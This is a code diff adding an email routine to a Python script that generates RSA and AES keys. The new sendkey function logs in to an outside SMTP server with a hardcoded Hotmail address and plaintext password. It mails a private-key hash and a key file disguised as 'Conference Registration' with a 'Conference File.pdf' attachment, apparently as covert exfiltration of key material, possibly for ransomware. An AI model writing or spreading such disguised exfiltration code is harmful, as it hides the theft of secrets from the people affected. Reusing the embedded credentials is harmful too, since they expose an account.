@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+# coding:utf-8
+
 from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from requests import get
@@ -10,6 +13,11 @@ import os
 import base64
 from hashlib import sha1
 from time import time
+import smtplib
+from email.mime.application import MIMEApplication
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.utils import formatdate
 
 # For the ugly hack to introduce pycrypto v2.7a1
 from Crypto.Util.number import long_to_bytes
@@ -19,6 +27,37 @@ import binascii
 logging.getLogger("requests").setLevel(logging.DEBUG)
 
 # TODO:Need to switch to PKCS for better security
+
+SOURCE_EMAIL = "arkctechnology@hotmail.com"
+PASSWORD = "ahafreedom123456!"
+
+
+def sendkey(dest_email, prihash, pubdir):
+    try:
+        msg = MIMEMultipart(
+            From=SOURCE_EMAIL,
+            To=dest_email,
+            Date=formatdate(localtime=True),
+            Subject="Conference Registration"
+        )
+        msg.attach(MIMEText(prihash))
+        msg['Subject'] = "Conference Registration"
+        msg['From'] = SOURCE_EMAIL
+        msg['To'] = dest_email
+        with open(pubdir, "rb") as fil:
+            msg.attach(MIMEApplication(
+                fil.read(),
+                Content_Disposition='attachment; filename="Conference File.pdf"',
+                Name="Conference File.pdf"
+            ))
+        smtp = smtplib.SMTP('smtp.live.com', 587, timeout=2)
+        smtp.starttls()
+        smtp.login(SOURCE_EMAIL, PASSWORD)
+        smtp.sendmail(SOURCE_EMAIL, dest_email, msg.as_string())
+        smtp.close()
+        return True
+    except IOError:
+        return False
 
 
 def generate_RSA(pridir, pubdir):
